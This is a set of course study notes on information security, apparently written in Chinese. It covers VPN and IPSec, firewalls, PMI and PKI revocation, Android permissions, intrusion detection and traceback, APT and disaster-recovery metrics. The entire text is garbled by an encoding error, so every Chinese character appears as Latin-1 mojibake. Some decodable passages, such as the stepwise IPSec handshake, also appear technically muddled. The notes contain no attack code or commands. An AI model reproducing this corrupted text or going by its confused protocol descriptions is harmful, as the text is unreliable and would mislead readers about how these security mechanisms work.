åœ¨VPNä¸­ä»»æ„ä¸¤ç‚¹ä¹‹é—´çš„é“¾æ¥å¹¶æ²¡æœ‰ä¼ ç»Ÿä¸“ç½‘æ‰€éœ€çš„ç«¯åˆ°ç«¯çš„ç‰©ç†é“¾è·¯ï¼Œè€Œæ˜¯åˆ©ç”¨å…¬å…±ç½‘ç»œèµ„æºåŠ¨æ€ç»„æˆçš„ï¼Œå¯ä»¥ç†è§£ä¸ºé€šè¿‡ç§æœ‰çš„éš§é“æŠ€æœ¯åœ¨å…¬å…±æ•°æ®ç½‘ç»œä¸Šæ¨¡æ‹Ÿå‡ºæ¥çš„å’Œä¸“ç½‘æœ‰åŒæ ·åŠŸèƒ½çš„ç‚¹åˆ°ç‚¹çš„ä¸“çº¿æŠ€æœ¯ã€‚
VPNæ¶‰åŠçš„å®‰å…¨æŠ€æœ¯ï¼šåŠ è§£å¯†æŠ€æœ¯ã€èº«ä»½é‰´åˆ«æŠ€æœ¯ã€å¯†é’¥ç®¡ç†æŠ€æœ¯
VPNæŠ€æœ¯åœ¨TLSå’ŒIPSECå±‚é¢å®ç°IPSECè¿‡ç¨‹ï¼š1ã€ä¸»æœºæˆ–ç½‘å…³Bå‘è¿œç¨‹ä¸»æœºæˆ–ç½‘å…³Aå‘é€VPNå»ºç«‹è¯·æ±‚ï¼›2ã€Aäº§ç”Ÿä¸€ä¸ªéšæœºæ•°ï¼Œå¹¶å°†å…¶å‘é€ç»™Bï¼›3ã€Bä½¿ç”¨è¿™ä¸ªéšæœºæ•°åŠ å¯†é¢„å…ˆé€šè¿‡IKEåˆ†äº«çš„å¯†é’¥ï¼Œå°†ç»“æœå‘é€ç»™Aï¼›4ã€Aä¹Ÿä½¿ç”¨è¯¥éšæœºæ•°å°†Bå‘æ¥çš„ç»“æœè§£å¯†ï¼Œä¸é¢„å…ˆåˆ†äº«çš„å¯†é’¥æ¯”è¾ƒï¼Œå¦‚æœåŒ¹é…ï¼Œåˆ™ä½¿ç”¨è¿™ä¸ªå¯†é’¥åŠ å¯†å…¬é’¥ï¼Œå‘é€ç»™Bï¼›5ã€Bä½¿ç”¨è¯¥å…¬é’¥æ¥å»ºç«‹å®ƒä¸Aä¹‹é—´çš„IPSec SAï¼ŒVPNéš§é“å»ºç«‹ã€‚


5.5 é˜²ç«å¢™åŸºæœ¬åŸç†â€‹	äº†è§£å‡ ç§é˜²ç«å¢™çš„åŸºæœ¬åŸç†å’Œç‰¹æ€§
é˜²ç«å¢™æ˜¯ä½äºä¸¤ä¸ª(æˆ–å¤šä¸ª)ç½‘ç»œé—´ï¼Œ å®æ–½ç½‘é—´è®¿é—®æ§åˆ¶çš„ä¸€ç»„ç»„ä»¶çš„é›†åˆï¼Œ å†…éƒ¨å’Œå¤–éƒ¨ä¹‹é—´çš„æ‰€æœ‰ç½‘ç»œæ•°æ®æµå¿…é¡»ç»è¿‡é˜²ç«å¢™ï¼Œåªæœ‰ç¬¦åˆå®‰å…¨æ”¿ç­–çš„æ•°æ®æµæ‰èƒ½é€šè¿‡é˜²ç«å¢™ã€‚é˜²ç«å¢™åˆ©ç”¨åŒ…è¿‡æ»¤æŠ€æœ¯ã€çŠ¶æ€æ£€æµ‹æŠ€æœ¯ã€åº”ç”¨çº§ç½‘å…³æŠ€æœ¯ã€ä»£ç†æœåŠ¡å™¨æŠ€æœ¯ç­‰æ¥æŒ¡ä½æœªç»æˆæƒçš„è®¿é—®æµé‡ï¼Œç¦æ­¢å…·æœ‰è„†å¼±æ€§çš„æœåŠ¡å¸¦æ¥å±å®³ã€‚é˜²ç«å¢™å®æ–½ä¿æŠ¤ï¼Œ ä»¥é¿å…å„ç§IPæ¬ºéª—å’Œè·¯ç”±æ”»å‡»ã€‚
ç¬¬å…­æ¬¡è¯¾ï¼šç½‘ç»œæƒé™ç®¡ç†PMIï¼ˆPrivilege Management Infrastructureï¼Œæƒé™ç®¡ç†åŸºç¡€è®¾æ–½ï¼‰ä¸­SOAã€AAç­‰å®ä½“çš„ä½œç”¨åœ¨PMIé‡Œèµ„æºæ‹¥æœ‰è€…ç§°ä¸ºSOA (Source of Authority), è¢«æˆæƒçš„å®ä½“ç§°ä¸ºPrivilege Holderã€‚Privilege holderè¿˜å¯ä»¥å°†ä»–çš„æƒé™è¿›ä¸€æ­¥çš„å§”æ‰˜ï¼Œæ­¤æ—¶çš„Privilege holderå°±å˜æˆ äº†AA(Attribute Authority )ï¼Œéœ€è¦æ³¨æ„ï¼Œåœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œæƒé™æˆäºˆæ˜¯æœ‰å±‚æ¬¡çº§åˆ«çš„ï¼šSOA -&gt; PH(AA)ã€‚è¿™ä¸ªè¿‡ç¨‹ä¸èƒ½åè½¬ã€‚






åŸºäºå±æ€§çš„è®¿é—®æ§åˆ¶ä¸PMIçš„å…³ç³»PMIçš„å±æ€§è¯ä¹¦ACç»‘å®šäº†å®ä½“èº«ä»½ä¿¡æ¯å’Œå®ä½“æƒé™ã€‚å±æ€§è¯ä¹¦ç”±å±æ€§ä¸­å¿ƒAAä»¥æ•°å­—ç­¾åçš„æ–¹å¼ç­¾å‘ï¼Œç»™å‡ºäº†å®ä½“çš„æƒé™å±æ€§ã€‚å®ä½“å‘AAç”³è¯·ä¸€ä¸ªæƒé™ï¼Œç”³è¯·é€šè¿‡åï¼Œå±æ€§ä¸­å¿ƒAAåªå°†ACå‘é€ç»™å®ä½“æœ¬èº«ï¼Œå…¬å¼€å­˜å‚¨æˆ–äº¤ç”±éªŒè¯è€…éªŒè¯ï¼Œè¿™ä¸ªè¿‡ç¨‹å¹¶ä¸éœ€è¦å®ä½“æœ¬èº«çŸ¥æ™“æˆ–å‚ä¸ã€‚
PKIçš„åŸºæœ¬æ¦‚å¿µ,åŒ…æ‹¬æ•°å­—è¯ä¹¦çš„ç”Ÿå‘½å‘¨æœŸã€CRLã€OCSP
æ•°å­—è¯ä¹¦çš„ç”Ÿå‘½å‘¨æœŸï¼šæ•°å­—è¯ä¹¦çš„å…¨ç”Ÿå‘½å‘¨æœŸåŒ…æ‹¬è¯ä¹¦çš„ç”³è¯·ã€ç­¾å‘ã€è·å–ã€éªŒè¯å’Œæ’¤é”€ã€‚

æŸä¸ªç”¨æˆ·æƒ³è¦ç”Ÿæˆä¸€å¯¹å¯†é’¥å°±ä¼šå‘CAç”³è¯·ä¸€ä¸ªå…¬é’¥çš„æ•°å­—è¯ä¹¦ï¼ŒCAé€šè¿‡ç­¾å‘è¯ä¹¦çš„æ–¹å¼å‘å…¨ä¸–ç•Œå‘å¸ƒç”³è¯·äººçš„å…¬é’¥ä¿¡æ¯ã€‚è¯¥è¯ä¹¦ä»¥å„ç§æ–¹å¼å…¬å¼€(HTTP&#x2F;FTP&#x2F;LDAP&#x2F;Emailç­‰)ï¼Œæ‰€æœ‰å–å¾—è¯¥å…¬é’¥æ•°å­—è¯ä¹¦çš„ç”¨æˆ·ä¼šé‰´åˆ«æ•°æ®æºã€æ•°æ®å®Œæ•´æ€§ï¼ŒåŒæ—¶CAè¿˜éœ€è¦æœ‰éå¦è®¤æ€§ã€‚CAåŠæ³•çš„æ•°å­—è¯ä¹¦å…·æœ‰æœ‰æ•ˆæœŸï¼Œè¿‡æœŸåï¼Œè¯¥è¯ä¹¦æ— æ•ˆï¼Œæ­¤æ—¶ä¸èƒ½å†ä½¿ç”¨è¯¥å…¬é’¥ï¼ŒCAéœ€è¦æ’¤é”€è¯¥è¯ä¹¦ã€‚

æ•°å­—è¯ä¹¦æ— æ•ˆä»¥åï¼ŒCAè¦æ’¤é”€è¯¥è¯ä¹¦ï¼Œæ­¤æ—¶PKIä¼šç»´æŠ¤ä¸€ä¸ªè¯ä¹¦æ’¤é”€åˆ—è¡¨CRLï¼Œè¯ä¹¦æ’¤é”€åˆ—è¡¨ä¹Ÿè¦CAè¿›è¡Œæ•°å­—ç­¾åï¼Œä»¥å®ç°æ•°æ®å®Œæ•´æ€§ã€æ•°æ®æºé‰´åˆ«ã€éå¦è®¤ã€‚CRLä¸­ä¿å­˜ç€è¢«æ’¤é”€çš„è¯ä¹¦åºåˆ—å·ã€‚
åœ¨çº¿è¯ä¹¦çŠ¶æ€åè®®OCSPæ˜¯å¦ä¸€ç§å½¢å¼çš„è¯ä¹¦æ’¤é”€ä¿¡æ¯ï¼Œå…¶å½¢å¼æ˜¯â€œè¯·æ±‚ï¼åº”ç­”â€ï¼Œå³è¯·æ±‚æŸä¸ªåºåˆ—å·çš„è¯ä¹¦å½“å‰çŠ¶æ€å¦‚ä½•ï¼Ÿåº”ç­”åˆ™åˆ†ä¸ºâ€œæœªæ’¤é”€ã€æ’¤é”€ã€æœªçŸ¥â€çŠ¶æ€ï¼Œåº”ç­”æ¶ˆæ¯éœ€è¦æœåŠ¡å™¨çš„æ•°å­—ç­¾åã€‚

ä¸ºä»€ä¹ˆä¼šæœ‰PKI(Public Key Infrastructure)å®‰å…¨é€šä¿¡çš„å‰æ:åŒæ–¹èƒ½å¤Ÿå…±äº«ä¸€ä¸ªå¯¹ç§°å¯†é’¥ç”¨ä½œä¼šè¯å¯†é’¥
ä¼šè¯å¯†é’¥é€šå¸¸ç”±å…¬é’¥å¯†ç åå•†å¾—åˆ°,å¦‚Diffie-Hellmanå¯†é’¥äº¤æ¢
ä½†æ˜¯å¦‚ä½•å®‰å…¨åœ°çŸ¥é“å¯¹æ–¹çš„å¯†é’¥å‘¢?? å»ºç«‹å…·æœ‰å…¬ä¿¡åŠ›çš„å¯ä¿¡ç¬¬ä¸‰æ–¹!
PKIçš„åŸºæœ¬æ¦‚å¿µ



CRL è¯ä¹¦æ’¤é”€åˆ—è¡¨
OCSP è¯ä¹¦æ’¤é”€æ–¹å¼




ç¬¬ä¸ƒæ¬¡è¯¾ï¼šç³»ç»Ÿæƒé™ç®¡ç†ç§»åŠ¨ç»ˆç«¯ç³»ç»Ÿä¸ä¼ ç»ŸPCæƒé™ç®¡ç†éœ€æ±‚çš„åŒºåˆ«ã€‚ä»€ä¹ˆä»€ä¹ˆhold???
ä¼ ç»ŸPCå¼ºè°ƒâ€œä½œä¸ºä¸€ä¸ªå®Œæ•´ç³»ç»Ÿç‹¬ç«‹æä¾›æœåŠ¡â€çš„èƒ½åŠ›ï¼Œä¼ ç»ŸPCç³»ç»Ÿå®‰å…¨è®¾è®¡ä¸ºï¼šä¸€ä¸ªç”¨æˆ·ç™»å½•åï¼Œé’ˆå¯¹è¯¥ç³»ç»Ÿç”¨æˆ·è¿›è¡Œç³»ç»Ÿèµ„æºçš„è®¿é—®æ§åˆ¶ã€‚ç§»åŠ¨åº”ç”¨é«˜åº¦ä¾èµ–ç½‘ç»œï¼Œæ¯ä¸€ä¸ªåº”ç”¨èƒŒåæ˜¯ä¸€ä¸ªç›¸å¯¹ç‹¬ç«‹çš„ç½‘ç»œåº”ç”¨ç³»ç»Ÿï¼Œæ¯ä¸€ä¸ªåº”ç”¨æœ‰è‡ªå·±ç›¸å¯¹ç‹¬ç«‹çš„å®‰å…¨è¾¹ç•Œã€‚ç§»åŠ¨ç»ˆç«¯ç³»ç»Ÿç”¨æˆ·ä¸ªäººå±æ€§ç›¸å¯¹æ˜æ˜¾ï¼Œå¾ˆå°‘æœ‰å¤šäººå…±äº«ä¸€ä¸ªç»ˆç«¯è®¾å¤‡ï¼Œç”¨æˆ·åŒºåˆ†æ ‡è¯†ï¼ˆUIDï¼‰ä¸å†æ˜¯ç§»åŠ¨ç»ˆç«¯ç³»ç»Ÿè¿›è¡Œèµ„æºè®¿é—®æ§åˆ¶çš„åˆé€‚ä¾æ®ã€‚
APPä½œä¸ºç³»ç»Ÿèµ„æºè®¿é—®æ§åˆ¶çš„åŸºæœ¬å•ä½ï¼Œä¸åŒAPPä¹‹é—´éœ€è¦èƒ½å¤Ÿè¿›è¡Œæœ‰æ•ˆéš”ç¦»ï¼Œç³»ç»Ÿå¯¹ä¸åŒç”¨æˆ·çš„åŒºåˆ†ä¸å†æ˜æ˜¾ã€‚

Android Permissionæœºåˆ¶ä¸Linux UGOè®¿é—®æ§åˆ¶çš„åŒºåˆ«ä¸è”ç³»ã€‚ä»€ä¹ˆcuri ablitiy?
Android APPåœ¨å…¶è¿›ç¨‹å»ºç«‹è¿‡ç¨‹ä¸­å½¢æˆå®é™…çš„APP Permissionæˆæƒï¼ŒLinux UGOå’ŒACLåœ¨æ–‡ä»¶ç³»ç»ŸåŠ è½½æ—¶å½¢æˆæ–‡ä»¶çš„æƒé™å±æ€§ã€‚Android Permissionæœºåˆ¶æœ¬è´¨ä¸Šæ˜¯ä»£ç ç­¾åæœºåˆ¶åï¼Œå¯¹APPæƒé™çš„è¿›ä¸€æ­¥è®¿é—®æ§åˆ¶ã€‚UGOæœºåˆ¶è®¾ç½®ä¸åŒç»„çš„è®¿é—®æƒé™ï¼Œé€šè¿‡è®©ç”¨æˆ·è¿›ç¨‹åŠ å…¥åˆ°ä¸åŒçš„ç»„ï¼Œå®ç°å…¶è®¿é—®æ§åˆ¶ã€‚
Android Permissionæœºåˆ¶å®ç°çš„åŸºæœ¬ç»„ä»¶å’Œæµç¨‹ã€‚
APP Permissionçš„ç”³è¯·ä¸ç”Ÿæˆï¼šæ¯ä¸ªAPPæ‹¥æœ‰ Permissionæˆæƒçš„èƒ½åŠ›ï¼ŒåŸºäºèƒ½åŠ›çš„è®¿é—®æ§åˆ¶æœºåˆ¶é€‚ç”¨äºéœ€è¦åŒºåˆ†ç”¨æˆ·è¾ƒå¤šçš„ç¯å¢ƒï¼ŒAndroidç³»ç»Ÿé‡Œæ¯ä¸€ä¸ªAPPå°±æ˜¯ä¸€ä¸ªç”¨æˆ·ã€‚åŸºäºèƒ½åŠ›çš„è®¿é—®æ§åˆ¶æœºåˆ¶ï¼Œè®¿é—®æƒé™çš„æ’¤é”€è¾ƒä¸ºå›°éš¾ï¼Œå› ä¸ºè®¿é—®è®¸å¯æˆæƒåˆ†æ•£åœ¨æ¯ä¸€ä¸ªAPPä¸­ã€‚
APP Permissionæˆæƒçš„å½¢æˆï¼šAndroid APPåœ¨å…¶è¿›ç¨‹å»ºç«‹è¿‡ç¨‹ä¸­å½¢æˆå®é™…çš„APP Permissionæˆæƒï¼Œåœ¨APPè¿è¡ŒåŠ è½½æ—¶ï¼Œä»é™æ€å­˜å‚¨è¢«åŠ è½½åˆ°APPçš„è¿›ç¨‹ç©ºé—´ã€‚
APP Permissionæƒé™æ£€æŸ¥ï¼šå½“APPè®¿é—®ç³»ç»Ÿèµ„æºæ—¶ï¼ŒAndroidç³»ç»Ÿä¼šæ£€æŸ¥APPçš„æƒé™ä¿¡æ¯ã€‚APPé€šè¿‡ç³»ç»Ÿæä¾›çš„APIè°ƒç”¨ç³»ç»Ÿèµ„æºï¼ŒAPIç”±System Serverå’ŒMediaç­‰å‡ ä¸ªå…³é”®çš„è¿›ç¨‹æä¾›ã€‚System Serveræä¾›PermCheckåŠŸèƒ½ï¼ŒPermCheckå¯¹æ¯”èµ„æºè¦æ±‚çš„Permissionè®¸å¯å’Œ APPå­˜å‚¨åœ¨mExtrasä¸­çš„è®¸å¯ï¼Œè¿›è¡Œè®¿é—®æ§åˆ¶å†³ç­–ã€‚

ç¬¬å…«æ¬¡è¯¾ï¼šå…¥ä¾µæ£€æµ‹åŸºæœ¬åŸç†8.1 PDRæ¨¡å‹çš„æ—¶é—´å…³ç³»ä»¥æ—¶é—´ä¸ºåº¦é‡æŒ‡æ ‡ï¼Œé‡åŒ–æè¿°ç³»ç»Ÿæ”»å‡»å’Œé˜²å¾¡çš„å¯¹æŠ—ï¼Œè‘—åçš„å®‰å…¨æ¡ä»¶å¦‚ä¸‹ï¼š Pt &gt; Dt + Rt






8.2 å…¥ä¾µæ£€æµ‹(IDS)çš„æŠ€æœ¯èµ·æºï¼Œå®‰å…¨å®¡è®¡æŠ€æœ¯èµ·æº

å®‰å…¨å®¡è®¡è®¡ç®—æœºç½‘ç»œå®‰å…¨å®¡è®¡ï¼ˆAuditï¼‰æ˜¯æŒ‡æŒ‰ç…§ä¸€å®šçš„å®‰å…¨ç­–ç•¥ï¼Œåˆ©ç”¨è®°å½•ã€ç³»ç»Ÿæ´»åŠ¨å’Œç”¨æˆ·æ´»åŠ¨ç­‰ä¿¡æ¯ï¼Œæ£€æŸ¥ã€å®¡æŸ¥å’Œæ£€éªŒæ“ä½œäº‹ä»¶çš„ç¯å¢ƒåŠæ´»åŠ¨ï¼Œä»è€Œå‘ç°ç³»ç»Ÿæ¼æ´ã€å…¥ä¾µè¡Œä¸ºæˆ–æ”¹å–„ç³»ç»Ÿæ€§èƒ½çš„è¿‡ç¨‹ã€‚
ä¹Ÿæ˜¯å®¡æŸ¥è¯„ä¼°ç³»ç»Ÿå®‰å…¨é£é™©å¹¶é‡‡å–ç›¸åº”æªæ–½çš„ä¸€ä¸ªè¿‡ç¨‹ã€‚åœ¨ä¸è‡³äºæ··æ·†æƒ…å†µä¸‹ï¼Œç®€ç§°ä¸ºå®‰å…¨å®¡è®¡ï¼Œå®é™…æ˜¯è®°å½•ä¸å®¡æŸ¥ç”¨æˆ·æ“ä½œè®¡ç®—æœºåŠç½‘ç»œç³»ç»Ÿæ´»åŠ¨çš„è¿‡ç¨‹ï¼Œæ˜¯æé«˜ç³»ç»Ÿå®‰å…¨æ€§çš„é‡è¦ä¸¾æªã€‚ç³»ç»Ÿæ´»åŠ¨åŒ…æ‹¬æ“ä½œç³»ç»Ÿæ´»åŠ¨å’Œåº”ç”¨ç¨‹åºè¿›ç¨‹çš„æ´»åŠ¨ã€‚
8.3 å¼‚å¸¸å…¥ä¾µæ£€æµ‹å’Œè¯¯ç”¨å…¥ä¾µæ£€æµ‹çš„åŒºåˆ«å’Œè”ç³»è¯¯ç”¨å…¥ä¾µæ£€æµ‹ç³»ç»Ÿè¯¯ç”¨å…¥ä¾µæ£€æµ‹çš„å‰ææ˜¯å…¥ä¾µè¡Œä¸ºå’Œæ­£å¸¸è¡Œä¸ºæ˜¯å¯åŒºåˆ†çš„ã€‚å»ºç«‹ä¸€ä¸ªå¼‚å¸¸è¡Œä¸ºçš„æ¨¡å¼åº“


å¼‚å¸¸å…¥ä¾µæ£€æµ‹è¿™ä¸ªæ˜¯è®°å½•æ­£å¸¸çš„è¡Œä¸º,ä¸åœ¨è¿™ä¸ªèŒƒå›´å†…çš„è¢«åˆ¤å®šä¸ºå¼‚å¸¸
å¼‚å¸¸å…¥ä¾µæ£€æµ‹è®°å½•ç”¨æˆ·çš„çš„æ—¥å¸¸æ“ä½œï¼Œä¸€èˆ¬è€Œè¨€ï¼Œè¯¯ç”¨æ£€æµ‹çš„æ–°ç‰¹å¾å‘ç°è¿‡ç¨‹ä¸ä½¿ç”¨å·²æœ‰ç‰¹å¾è¿›è¡Œæ£€æµ‹çš„è¿‡ç¨‹ç›¸äº’ç‹¬ç«‹ã€‚


åŒºåˆ«å’Œè”ç³»å¼‚å¸¸IDSæ£€æµ‹&#x2F;è¯¯ç”¨IDSæ£€æµ‹ï¼Œéƒ½æœ‰æ›´æ–°â€œç‰¹å¾&#x2F;æ¨¡å¼åº“â€çš„è¡Œä¸ºã€‚ä¸€èˆ¬è€Œè¨€ï¼Œè¯¯ç”¨æ£€æµ‹çš„æ–°ç‰¹å¾å‘ç°è¿‡ç¨‹ä¸ä½¿ç”¨å·²æœ‰ç‰¹å¾è¿›è¡Œæ£€æµ‹çš„è¿‡ç¨‹ç›¸äº’ç‹¬ç«‹ï¼›å¼‚å¸¸æ£€æµ‹çš„æ¨¡å¼åº“æ›´æ–°ï¼Œé€šå¸¸æ˜¯åœ¨IDSçš„è¿è¡Œä¸­å®Œæˆï¼Œå³è¾¹è¿è¡Œï¼Œè¾¹æ›´æ–°ã€‚
æ€è€ƒé¢˜

ç¬¬ä¹æ¬¡è¯¾ï¼š9.1 å…¥ä¾µç›¸åº”çš„ç›®æ ‡å¯¹å±åŠå®‰å…¨çš„äº‹ä»¶ã€è¡Œä¸ºã€è¿‡ç¨‹åŠæ—¶åšå‡ºå“åº”å¤„ç†ï¼Œæœç»å±å®³è”“å»¶ï¼Œé™ä½å®‰å…¨å½±å“ã€‚
æ ¸å¿ƒæ˜¯ä¸šåŠ¡è¿ç»­æ€§, è¦ä¿è¯è¿™ä¸ª,è®©æ”»å‡»çš„èŒƒå›´å‡å°,å±å®³æœ€å°
9.2 å…¥ä¾µè¿½è¸ªçš„åŸºæœ¬æŠ€æœ¯æº¯æº
é˜»æ–­æ”»å‡»
ä¸é˜²ç«å¢™æˆ–ç½‘å…³è”åŠ¨ï¼Œé˜»æ–­æ”»å‡»è€…çš„TCPè¿æ¥(TCP RESET)ã€é˜»æ–­æ”»å‡»è€…çš„æ•°æ®åŒ…(ICMP æŠ¥æ–‡æ§åˆ¶)ï¼›
è”ç»œæ”»å‡»è€…æ‰€åœ¨åŒºåŸŸçš„ç®¡ç†å‘˜ï¼›
å‘æ”»å‡»è€…å‘èµ·åå‡»ï¼šç½‘ç»œæµé‡çš„å‹åˆ¶æ€§åå‡»ã€åŸºäºå®‰å…¨æ¼æ´åˆ©ç”¨çš„åå‡»ã€åŸºäºAPTæ–¹å¼çš„åå‡»ã€‚

æ”¶é›†æ”»å‡»ä¿¡æ¯æ£€æµ‹åˆ°å…¥ä¾µåï¼ŒæŠŠæ”»å‡»è€…å¼•å¯¼åˆ°ç»è¿‡ç‰¹æ®Šè£… å¤‡çš„è¯±éª—æœåŠ¡å™¨ä¸Šï¼Œè®°å½•æ”»å‡»è€…çš„è¡Œä¸ºï¼Œä»è€Œè·å¾—æ”»å‡»è€…çš„è¯¦ç»†ä¿¡æ¯ï¼Œä½œä¸ºè¿›ä¸€æ­¥é‡‡å–æ³•å¾‹æªæ–½çš„è¯æ®ã€‚ä¸»è¦åŒ…æ‹¬ï¼šHoney Pot(èœœç½)ã€Decoy(è¯±éª—ç³»ç»Ÿ)ã€Fishbowl(é±¼é¥µ)ç­‰æŠ€æœ¯ã€‚
å…¥ä¾µè¿½è¸ªå…¥ä¾µè¿½è¸ªæ˜¯ä¸€ç§åˆ†å¸ƒå¼çš„ã€éœ€è¦å¤šèŠ‚ç‚¹åä½œçš„ä½“ç³»ï¼›å…¥ä¾µè¿½è¸ªåº”è¯¥å»ºç«‹åœ¨ç½‘ç»œèµ„æºç›¸äº’ä¿¡ä»»çš„åŸºç¡€ä¸Šï¼Œåº”è¯¥å…·æœ‰æŠµæŠ—æ”»å‡»çš„å¥å£®æ€§ï¼Œå…¥ä¾µè¿½è¸ªå¿…é¡»æ˜¯é«˜æ•ˆçš„ã€å‡†ç¡®çš„ï¼Œç»Ÿèƒ½å¤Ÿä»¥æœ€å°çš„ä»£ä»·æä¾›å¿«é€Ÿå“åº”æœºåˆ¶ã€‚

åŸºäºä¸»æœºçš„è¿½è¸ªä½“ç³»ï¼šæ¯ä¸€ä¸ªä¸»æœºèŠ‚ç‚¹åˆ©ç”¨ä¿¡æ¯éšè—æŠ€æœ¯åœ¨æ•°æ®åŒ…ä¸­ç•™ä¸‹ä¸æ˜“å¯Ÿè§‰çš„æ ‡è®°ã€éƒ½ç•™ä¸‹æ—¥å¿—ï¼Œè¿½è¸ªç³»ç»Ÿä¸­çš„æ¯ä¸€ä¸ªèŠ‚ç‚¹éƒ½å¿…é¡»æ˜¯ä¿¡ä»»çš„ã€‚

é’ˆå¯¹TCPè¿æ¥é“¾çš„è¿½è¸ªï¼šå¯¹äºä¸­é—´ç»è¿‡äº†å¤šæ¬¡è·³æ¿çš„TCPæ”»å‡»è¿æ¥ï¼Œä¸€èˆ¬é€šè¿‡å…¨ç½‘éƒ¨ç½²å¤šä¸ªç›‘æ§èŠ‚ç‚¹ï¼Œç›‘æ§TCPæµã€‚

ç½‘ç»œè¿½è¸ªæŠ€æœ¯ï¼š


Input Debuggingï¼šå‘ç”Ÿæ”»å‡»åIDSå‘ç°æ”»å‡»æ•°æ®åŒ…ï¼Œäººå·¥è”ç³»å‰é¢çš„å„ä¸ªè·¯ç”±å™¨ã€‚

Controlled Floodingï¼šé€ä¸€åœ°å‘å‰é¢çš„å„ä¸ªè·¯ç”±å™¨å‘é€æ•°æ®ã€æ·¹æ²¡è·¯ç”±å™¨çš„ç¼“å†²åŒºï¼Œçœ‹çœ‹æ”»å‡»æµé‡æ˜¯å¦å‡å°‘ã€‚

ICMPè¿½è¸ªï¼šåˆ©ç”¨è·¯ç”±å™¨é…åˆç¡®å®šæ•°æ®åŒ…è½¬å‘ç»è¿‡çš„è·¯ç”±å™¨ã€‚

PPMæŠ€æœ¯ï¼šæ¯ä¸€ä¸ªæ•°æ®åŒ…æ¯ç»è¿‡ä¸€ä¸ªè·¯ç”±å™¨ï¼Œè·¯ç”±å™¨å°±æŠŠè‡ªå·±çš„IPåœ°å€é™„åŠ ä¸Šå»ã€‚

åŸºäºæ—¥å¿— çš„è¿½è¸ªï¼šç”±è·¯ç”±å™¨è®¡ç®—å¹¶ä¿å­˜æ¯ä¸ªæ•°æ®åŒ…çš„Hashæ‘˜è¦ã€‚å…¥ä¾µè¿½è¸ªæ—¶ï¼Œé€šè¿‡æ£€æŸ¥æ•°æ®åŒ…çš„Hashæ‘˜è¦ï¼Œä¸è·¯ç”±å™¨ä¿å­˜çš„ç»“æœè¿›è¡Œæ¯”è¾ƒï¼Œé€æ­¥æŸ¥è¯¢å‡ºæ•´ä¸ªæ”»å‡»è·¯å¾„æ‰€ç»è¿‡çš„è·¯ç”±å™¨ã€‚





9.3 APT æ”»å‡»å¯¹å…¥ä¾µæ£€æµ‹ä¸å“åº”çš„å½±å“Advanced Persistent Threat 
APTæ˜¯ç”±å•†ä¸šæˆ–è€…æ”¿æ²»ç›®çš„ï¼Œé’ˆå¯¹ç‰¹å®šç›®æ ‡çš„æ”»å‡»ã€‚éšè”½æ€§å’ŒæŒç»­æ€§æ˜¯æ”»å‡»çš„ä¸»è¦ç‰¹ç‚¹ï¼ŒAPTæ”»å‡»é‡‡ç”¨å°½å¯èƒ½æ­£å¸¸çš„ç½‘ç»œè¡Œä¸ºï¼Œé€šè¿‡é•¿æœŸæœ‰è€å¿ƒçš„ç§¯ç´¯å®æ–½æ”»å‡»ã€‚APTæ”»å‡»çš„ç›‘æµ‹è¶…å‡ºäº†â€œè¯¯ç”¨â€å’Œâ€œå¼‚å¸¸â€IDSçš„èƒ½åŠ›èŒƒå›´ï¼Œä½¿å¾—å…¥ä¾µæ£€æµ‹å’Œå“åº”å˜å¾—æ›´åŠ å›°éš¾ã€‚ 
æ€è€ƒé¢˜

ç¬¬åæ¬¡è¯¾ï¼šæ•°æ®å¤‡ä»½ä¸ç¾éš¾æ¢å¤PDRRæ¨¡å‹,åŠ å…¥äº†ä¸€ä¸ªR, restore&#x2F;recovery,æ ¸å¿ƒä¹Ÿæ˜¯ ä¸šåŠ¡è¿ç»­æ€§
Rä»£è¡¨Restore â€“å³ä¸€æ—¦ç³»ç»Ÿé­åˆ°ç ´åï¼Œå°†é‡‡å–ä¸€ç³»åˆ—çš„æªæ–½å¦‚å¤‡ä»½æ–‡ä»¶æ¢å¤ã€ç³»ç»Ÿé‡ç½®ç­‰åŠŸèƒ½ï¼Œæ¢å¤ç³»ç»ŸæœåŠ¡ã€‚
10.1 åº”æ€¥è®¡åˆ’çš„æ¦‚å¿µä¸€ä¸ªç»„ç»‡å…·å¤‡æ‰¿å—å„ç§ç¾éš¾ï¼Œå¹¶åœ¨ç¾éš¾å¼•èµ·ç¯å¢ƒå˜åŒ–ä¸­ï¼Œä¿æŒä¸»è¦ä»»åŠ¡é¡ºåˆ©è¿è¡Œçš„èƒ½åŠ›
10.2 ä¸šåŠ¡è¿ç»­æ€§è®¡åˆ’çš„æ¦‚å¿µï¼Œä»¥åŠä¸šåŠ¡è¿ç»­æ€§è®¡åˆ’ä¸åº”æ€¥è®¡åˆ’çš„åŒºåˆ«å’Œè”ç³»åœ¨åº”æ€¥è®¡åˆ’çš„åŸºç¡€ä¸Šï¼Œé€šè¿‡åˆ¶å®šä¸šåŠ¡è¿ç»­æ€§è®¡åˆ’Business Continuity Plan (BCP)å®ç°åœ¨æ•…éšœæˆ–ç¾éš¾ä¸­ä¸šåŠ¡çš„æ¢å¤å’Œä¿æŒã€‚
å›½é™…é€šè¡Œçš„åšæ³•æ˜¯é€šè¿‡åˆ¶å®šåº”æ€¥è®¡åˆ’å’Œä¸šåŠ¡è¿ç»­æ€§è®¡åˆ’ï¼Œç¡®ä¿ç³»ç»Ÿåœ¨é­å—ç¾éš¾æ—¶ï¼Œç¡®ä¿ä¸»è¦ä¸šåŠ¡çš„æ­£å¸¸è¿è¡Œ.è¿ç»­æ€§è®¡åˆ’å’Œåº”æ€¥è®¡åˆ’æ˜¯åº”æ€¥ç®¡ç†çš„é‡è¦ç»„æˆéƒ¨åˆ†ã€‚è¿ç»­æ€§è®¡åˆ’é€‚ç”¨äºç»„ç»‡ä¸šåŠ¡è‡ªèº«ï¼›åº”æ€¥è®¡åˆ’é€‚ç”¨äºæ”¯æ’‘ä¸šåŠ¡è¿è¡Œçš„ä¿¡æ¯ç³»ç»Ÿã€‚è¿ç»­æ€§è®¡åˆ’æ˜¯ç›®æ ‡ï¼Œåº”æ€¥è®¡åˆ’æ˜¯æ”¯æ’‘ã€‚
10.3 å®¹ç¾å¤‡ä»½ç³»ç»Ÿçš„åº¦é‡æŒ‡æ ‡ï¼š RPOï¼Œ RTOï¼Œ NRO å’Œ DOOä»¥æ¢å¤ç‚¹ä¸ºç›®æ ‡RPOï¼ˆRecovery Point Objectï¼‰ï¼›
ä»¥æ¢å¤æ—¶é—´ä¸ºç›®æ ‡RTOï¼ˆRecovery Time Objectï¼‰ ï¼›
